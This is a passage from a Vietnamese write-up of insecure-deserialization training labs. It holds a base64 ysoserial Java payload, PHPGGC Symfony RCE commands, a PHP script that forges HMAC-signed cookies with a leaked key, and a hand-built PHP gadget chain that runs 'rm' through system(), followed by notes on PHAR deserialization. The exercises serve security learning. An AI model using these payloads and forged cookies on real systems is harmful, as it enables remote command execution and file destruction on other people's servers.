aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29y
Zy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVy
MMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVj
dGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25z
NC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29s
bGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25z
dGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5p
bnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUu
Y29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+k
htA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGph
dmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFz
cgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVz
SW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVj
b2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFf
b3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tb
Qkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABqzK/rq+AAAAMgA5CgADACIH
ADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4B
AAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRh
YmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2Vy
aWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9y
bQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9z
dW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxl
cjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0
Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2Vy
aWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3Vu
L29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUv
eG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwv
aW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1
TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdo
YW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp
YWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5
c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20v
c3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5z
bGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50
ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9H
YWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUo
KUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAacm0gL2hvbWUvY2FybG9zL21vcmFsZS50
eHQIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAy
ADMKACsANAEADVN0YWNrTWFwVGFibGUBABx5c29zZXJpYWwvUHduZXIxNDYxODI0OTQwNTU4AQAe
THlzb3NlcmlhbC9Qd25lcjE0NjE4MjQ5NDA1NTg7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIA
CAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAALwAOAAAADAABAAAA
BQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAANAAOAAAAIAADAAAA
AQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAA
AAGxAAAAAgANAAAABgABAAAAOAAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQAC
AAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVex
AAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgAfAAAB1Mr+ur4AAAAy
ABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx
5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZh
cmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXls
b2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcA
GgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVj
dAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0
cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwAB
sQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAW
ABAACXB0AARQd25ycHcBAHh1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAF2
cgAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXMAAAAAAAAAAAAAAHhwdwQAAAADc3IAEWph
dmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyV
HQuU4IsCAAB4cAAAAAFxAH4AKXg=
```

![img17]()

## PHP Generic Gadget Chains

Hầu hết các ngôn ngữ thường xuyên gặp phải lỗ hổng deserialization không an toàn đều có các công cụ chứng minh. Ví dụ, đối với các trang web dựa trên `PHP`, bạn có thể sử dụng [PHP Generic Gadget Chains](https://github.com/ambionics/phpggc)

> Lab: Exploiting PHP deserialization with a pre-built gadget chain

Đăng nhập với tài khoản quen thuộc , `inspector` `cookie` , nó được mã hóa bằng `base64` quen thuộc

![img18]()

```
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ2aHk1bmQwMTFmdzZkMTB3OHh5YTdsZG1sajAxNHB1ZyI7fQ==","sig_hmac_sha1":"639c79ce2f3396311e88886629b4d1f58ceac1ca"}
```

Token được kí bằng hàm băm `SHA-1 HMAC`, token trong cookie cũng được mã hóa `base64`, cho vào `decoder` và tiến hành giải mã

![img19]()

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"vhy5nd011fw6d10w8xya7ldmlj014pug";}
```

Tôi sẽ thử đổi giá trị của trường `username` thành `carlos`

![img20]()

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ2aHk1bmQwMTFmdzZkMTB3OHh5YTdsZG1sajAxNHB1ZyI7fQ==
```

Tôi lấy đoạn mã `base64` mới thay thế giá trị cho `token` , `Apply change` và `send` lại thì nhận được thông báo lỗi và tất nhiên chữ ký cũng không khớp

![img21]()

```
Internal Server Error: Symfony Version: 4.3.6

PHP Fatal error:  Uncaught Exception: Signature does not match session in /var/www/index.php:7
Stack trace:
#0 {main}
  thrown in /var/www/index.php on line 7
```

Thông báo lỗi cho biết trang web đang sử dụng nền tảng `Symfony 4.3.6.` để biết chi tiết hơn có lẽ ta cần tìm thông tin về file `info.php`(file này có thể sẽ hơi khác một chút ở từng bài)

Kiểm tra `sitemap` sẽ thấy nó ở `/cgi-bin/phpinfo.php` , gửi request đến và nhận về response nó có thể là nơi tìm thấy `key` để ký

![img22]()

Nhìn nó trông khá loẳng ngoằng do file này sẽ hiển thị khá nhiều thông tin về mục tiêu hiển thị dưới dạng bảng, tôi sẽ gửi ra trình duyệt để thấy rõ hơn

![img23]()

- Secret_key: yj6o08j7w23gmgwd30wxgv8ue7k7ta3i

- Bây giờ sử dụng công cụ `PHPGGC` để tạo ra một đối tượng `serialized` trên `gadget chain` là `Symfony` để xóa file của người dùng `carlos`

  ```
  ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
  ```

  ![img24]()

Bây giờ cần xây dựng một `cookie` hợp lệ chứa đối tượng này và ký bằng đúng `secret_key` ta vừa tìm được. Bạn có thể sử dụng tập lệnh `PHP` sau để thực hiện việc này. Trước khi chạy tập lệnh, bạn chỉ cần thực hiện các thay đổi sau:

- Gán đối tượng bạn đã tạo trong `PHPGGC` cho biến `$object`

- Gán khóa bí mật mà bạn đã sao chép từ `phpinfo.php` vào biến `$secretKey`

  ```
  <?php
  $object = "OBJECT-GENERATED-BY-PHPGGC";
  $secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
  $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
  echo $cookie;
  ?>
  ```

  ![img25]()

  ```
  <?php
  $object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
  $secretKey = "zg213dheuxlbs2epkokz2wk8cs8amf1e";
  $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
  echo $cookie;
  ?>
  ```

  Chạy `script` và thu được cookie cuối cùng

  ![img26]()

  ```
  %7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg%3D%3D%22%2C%22sig_hmac_sha1%22%3A%2257c3709132e06de598ad0de52aa97657fc092b48%22%7D
  ```

  ![img27]()

## Creating your own exploit

Khi các `gadget chains` có sẵn và khai thác được ghi chép không thành công, bạn sẽ cần tạo khai thác của riêng mình.

Để xây dựng thành công chuỗi tiện ích của riêng mình, bạn gần như chắc chắn sẽ cần quyền truy cập mã nguồn. Bước đầu tiên là nghiên cứu mã nguồn này để xác định lớp chứa `magic method` được gọi trong quá trình hủy tuần tự hóa. Đánh giá mã mà phương thức ma thuật này thực thi để xem liệu nó có trực tiếp gây ra bất kỳ điều gì nguy hiểm với các thuộc tính do người dùng kiểm soát hay không. Điều này luôn đáng để kiểm tra và phòng ngừa.

Nếu `magic method` không thể khai thác riêng lẻ, nó có thể đóng vai trò là `gadget chains` của bạn cho một `gadget chains`. Nghiên cứu bất kỳ phương thức nào mà tiện ích khởi động gọi. Có bất kỳ phương thức nào trong số này gây ra điều gì nguy hiểm với dữ liệu mà bạn kiểm soát không? Nếu không, hãy xem xét kỹ hơn từng phương thức mà chúng gọi sau đó, v.v.

> Lab: Developing a custom gadget chain for PHP deserialization

Login với tài khoản `winer:peter` lấy được giá trị `cookie`

![img29]()

Đối với những bài thuộc dạng phải custom `gadget chain` thì thường sẽ có thể xem được source

Kiểm tra source sẽ thấy có một dòng bị `comment`

![img28]()

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"uzcz8xpbbxs3p3wugxubfee9h27lrvc3";}
```

Thêm `~` phía sau và truy cập vào để xem source `/cgi-bin/libs/CustomTemplate.php~`

```
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

Vẫn là phải thực hiện được câu lệnh `rm /home/carlos/molare.txt`. Với class `DefaultMap` có xây dựng một hàm `__get` , trong hàm này có gọi đến một `magic method`. Phương thức này sẽ thực thi bất cứ hàm nào được truyền vào thông qua thuộc tính `DefaultMap->callback`. Hàm này sẽ thực thi trên `$name`

- Vì vậy `this->callback` sẽ có giá trị là `system` hoặc `exec`, điều này có thể dễ dàng làm được thông qua việc khởi tạo đối tượng `DefaultMap` ví dụ như `$test = new DefaultMap('exec');`

- `magic method __get()` thực thi khi truy cập đến thuộc tính không được `public` hoặc không tồn tại của đối tượng đó khi được truyền vào hàm.

Ở class `Product` có `$this->desc = $desc->$default_desc_type;`. Nếu `$desc` là một đối tượng `DefaultMap` thì `$default_desc_type` có giá trị là `rm /home/carlos/morale.txt` thì phương thức `__get` sẽ được chạy. Hơn hết 2 giá trị thuộc tính `desc` và `default_desc_type` thuộc class `CustomTemplate` nên có thể dễ dàng thao túng. Trong mã nguồn , `magic method` là `__wakeup()` của class `CusTomTemplate` sẽ tạo ra một `Product` mới bằng cách lấy giá trị của 2 thuộc tính `default_desc_type` và `desc`

```
CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt";
CustomTemplate->desc = DefaultMap;
DefaultMap->callback = "exec"
```

```
<?php

class CustomTemplate
{
    public $default_desc_type;
    public $desc;

    public function __construct($default_desc_type, $desc)
    {
        $this->default_desc_type = $default_desc_type;
        $this->desc = $desc;
    }
}


class DefaultMap
{
    public $callback;

    public function __construct($callback)
    {
        $this->callback = $callback;
    }
}

$defaultmap = new DefaultMap('system');
$custom = new CustomTemplate('rm /home/carlos/morale.txt', $defaultmap);
echo serialize($custom);
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:6:"system";}}
```

Lúc này đối tượng `Product` sẽ được tạo ra do hàm tạo của `CusTomTemplate`

```
$this->product = new Product($this->default_desc_type, $this->desc);
class Product {
  public $desc;

  public function __construct($default_desc_type, $desc) {
      $this->desc = $desc->$default_desc_type;
  }
}
```

Nếu bạn theo dõi luồng dữ liệu trong mã nguồn, bạn sẽ nhận thấy rằng điều này khiến cho Producthàm tạo cố gắng và lấy dữ liệu `default_desc_type` từ `DefaultMap`. Vì nó không có thuộc tính này, phương thức `__get()` sẽ gọilại trên `exec()`, được đặt thành lệnh shell của chúng ta.

Mã hóa `base64` và `URL encode` được

```
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MTc6ImRlZmF1bHRfZGVzY190eXBlIjtzOjI2OiJybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7czo0OiJkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjg6ImNhbGxiYWNrIjtzOjY6InN5c3RlbSI7fX0%3D
```

Đối tượng Product sử dụng thuộc tính desc, là một đối tượng DefaultMap. Khi Product cố gắng truy cập thuộc tính không tồn tại trong DefaultMap, phương thức \_\_get() của DefaultMap sẽ được kích hoạt. Nếu callback được cấu hình là một hàm như system(), nó sẽ thực thi lệnh shell với tên thuộc tính là đối số.

Ví dụ thực tế: Nếu default_desc_type là 'rm /home/carlos/morale.txt', phương thức \_\_get() sẽ thực thi lệnh system('rm /home/carlos/morale.txt'), dẫn đến việc xóa tệp không mong muốn.

## PHAR deserialization

Cho đến nay, chúng ta chủ yếu xem xét khai thác lỗ hổng `deserialization` khi trang web `deserialization` rõ ràng dữ liệu đầu vào của người dùng. Tuy nhiên, trong PHP đôi khi có thể khai thác `deserialization` ngay cả khi không có cách sử dụng rõ ràng nào cho `unserialize()` này.

PHP cung cấp một số trình bao bọc theo kiểu URL mà bạn có thể sử dụng để xử lý các giao thức khác nhau khi truy cập đường dẫn tệp. Một trong số đó là trình `phar://`, cung cấp giao diện luồng để truy cập tệp `PHP Archive ( .phar)`.

Tài liệu PHP cho thấy các tệp `PHAR` chứa siêu dữ liệu tuần tự hóa. Quan trọng là, nếu bạn thực hiện bất kỳ hoạt động hệ thống tệp nào trên luồng `phar://` , siêu dữ liệu này sẽ được hủy tuần tự hóa ngầm định. Điều này có nghĩa là luồng `phar://` có khả năng là một vectơ để khai thác hủy tuần tự hóa không an toàn, với điều kiện là bạn có thể truyền luồng này vào một phương thức hệ thống tệp.

Trong trường hợp các phương pháp hệ thống tệp rõ ràng là nguy hiểm, chẳng hạn như `include()` hoặc `fopen()`, các trang web có thể đã triển khai các biện pháp đối phó để giảm khả năng chúng bị sử dụng một cách độc hại. Tuy nhiên, các phương pháp như `file_exists()`, không quá nguy hiểm, có thể không được bảo vệ tốt.

Kỹ thuật này cũng yêu cầu bạn phải tải `PHAR` lên máy chủ theo một cách nào đó. Một cách tiếp cận là sử dụng chức năng tải lên hình ảnh, ví dụ. Nếu bạn có thể tạo một tệp đa ngôn ngữ, với một `PHAR` ngụy trang thành một tệp đơn giản JPG, đôi khi bạn có thể bỏ qua các kiểm tra xác thực của trang web. Nếu sau đó bạn có thể buộc trang web tải tệp đa ngôn ngữ này " JPG" từ một luồng `phar://` , bất kỳ dữ liệu có hại nào bạn đưa vào thông qua `PHAR` siêu dữ liệu sẽ được hủy tuần tự hóa. Vì phần mở rộng tệp không được kiểm tra khi PHP đọc luồng, nên việc tệp sử dụng phần mở rộng hình ảnh không quan trọng.

Miễn là lớp của đối tượng được trang web hỗ trợ thì cả hai phương thức magic `__wakeup()` và `__destruct()` có thể được gọi theo cách này, cho phép bạn có khả năng khởi động chuỗi tiện ích bằng kỹ thuật này.
